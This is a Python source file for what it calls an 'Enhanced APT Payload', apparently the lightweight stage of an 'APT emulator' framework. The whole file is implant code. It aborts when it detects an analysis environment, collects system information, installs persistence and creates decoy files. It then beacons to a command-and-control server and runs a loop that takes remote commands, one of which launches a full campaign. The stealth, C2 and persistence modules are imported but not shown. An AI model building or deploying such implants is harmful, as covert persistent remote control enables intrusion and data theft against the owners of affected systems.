# Enhanced APT Payload - Secondary Entry Point
# Lightweight payload for deployment and execution

import os
import sys
import time
import json
from datetime import datetime

# Import configuration
from config import (
    TRANSMISSION_INTERVAL, LOG_FILE, BELIEVABLE_FILES,
    SILENT_MODE, DEBUG_MODE
)

# Import core modules
from core import (
    stealth_manager, c2_client, persistence_manager, recon_manager
)

class LightweightPayload:
    """Lightweight payload for rapid deployment"""
    
    def __init__(self):
        self.payload_id = f"payload_{int(time.time())}"
        self.execution_data = {}
        
    def execute(self):
        """Execute the lightweight payload"""
        try:
            # Initialize stealth first
            stealth_manager.initialize_stealth()
            
            # Check for analysis environment
            if stealth_manager.should_abort_execution():
                return False
            
            # Gather basic system information
            basic_info = recon_manager.get_basic_system_info()
            
            # Install persistence if not already present
            persistence_manager.install_all_persistence()
            
            # Create decoy files
            self._create_decoy_files()
            
            # Send initial beacon
            beacon_data = {
                'type': 'payload_beacon',
                'payload_id': self.payload_id,
                'timestamp': datetime.now().isoformat(),
                'system_info': basic_info
            }
            
            c2_client.send_data(beacon_data, endpoint="/beacon")
            
            # Start monitoring loop
            self._monitoring_loop()
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Payload execution failed: {e}")
                )
            return False
    
    def _create_decoy_files(self):
        """Create believable decoy files"""
        try:
            for filename, content in BELIEVABLE_FILES.items():
                if not os.path.exists(filename):
                    with open(filename, 'w') as f:
                        f.write(content)
                    
                    if DEBUG_MODE:
                        print(f"Created decoy: {filename}")
                        
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Decoy creation failed: {e}")
                )
    
    def _monitoring_loop(self):
        """Lightweight monitoring and communication loop"""
        try:
            loop_count = 0
            
            while True:
                try:
                    # Send periodic beacon
                    if loop_count % 10 == 0:  # Every 10th iteration
                        beacon_data = {
                            'type': 'heartbeat',
                            'payload_id': self.payload_id,
                            'timestamp': datetime.now().isoformat(),
                            'loop_count': loop_count
                        }
                        
                        c2_client.send_data(beacon_data, endpoint="/heartbeat")
                    
                    # Check for commands
                    commands = c2_client.receive_commands()
                    if commands:
                        self._process_commands(commands)
                    
                    # Increment loop counter
                    loop_count += 1
                    
                    # Wait with jitter
                    stealth_manager.add_jitter(
                        TRANSMISSION_INTERVAL * 0.5,
                        TRANSMISSION_INTERVAL * 1.0
                    )
                    
                except Exception as e:
                    if DEBUG_MODE:
                        stealth_manager.safe_execute(
                            lambda: print(f"Monitoring loop error: {e}")
                        )
                    
                    # Wait before retry
                    stealth_manager.add_jitter(60, 120)
                    
        except KeyboardInterrupt:
            self._shutdown()
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Monitoring loop failed: {e}")
                )
    
    def _process_commands(self, commands):
        """Process commands from C2 server"""
        try:
            if not isinstance(commands, list):
                commands = [commands]
            
            for command in commands:
                cmd_type = command.get('type', '')
                
                if cmd_type == 'upgrade_payload':
                    # Upgrade to full APT emulator
                    self._upgrade_to_full_emulator()
                
                elif cmd_type == 'collect_basic_info':
                    # Send basic system information
                    info = recon_manager.get_basic_system_info()
                    c2_client.send_data(info, endpoint="/info")
                
                elif cmd_type == 'install_persistence':
                    # Reinstall persistence mechanisms
                    persistence_manager.install_all_persistence()
                
                elif cmd_type == 'create_decoys':
                    # Create additional decoy files
                    self._create_decoy_files()
                
                elif cmd_type == 'shutdown':
                    self._shutdown()
                    return
                
                else:
                    if DEBUG_MODE:
                        print(f"Unknown payload command: {cmd_type}")
                        
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Command processing failed: {e}")
                )
    
    def _upgrade_to_full_emulator(self):
        """Upgrade to full APT emulator"""
        try:
            # Import and execute main APT emulator
            from main import APTEmulator
            
            upgrade_data = {
                'type': 'upgrade_initiated',
                'payload_id': self.payload_id,
                'timestamp': datetime.now().isoformat()
            }
            
            c2_client.send_data(upgrade_data, endpoint="/status")
            
            # Start full emulator
            emulator = APTEmulator()
            emulator.run_campaign()
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Payload upgrade failed: {e}")
                )
    
    def _shutdown(self):
        """Shutdown the payload"""
        try:
            shutdown_data = {
                'type': 'payload_shutdown',
                'payload_id': self.payload_id,
                'timestamp': datetime.now().isoformat()
            }
            
            c2_client.send_data(shutdown_data, endpoint="/status")
            
            if DEBUG_MODE:
                print("Payload shutdown complete")
            
            sys.exit(0)
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Payload shutdown failed: {e}")
                )

def main():
    """Main payload entry point"""
    try:
        payload = LightweightPayload()
        payload.execute()
        
    except Exception as e:
        if DEBUG_MODE:
            stealth_manager.safe_execute(
                lambda: print(f"Payload main failed: {e}")
            )

if __name__ == '__main__':
    main()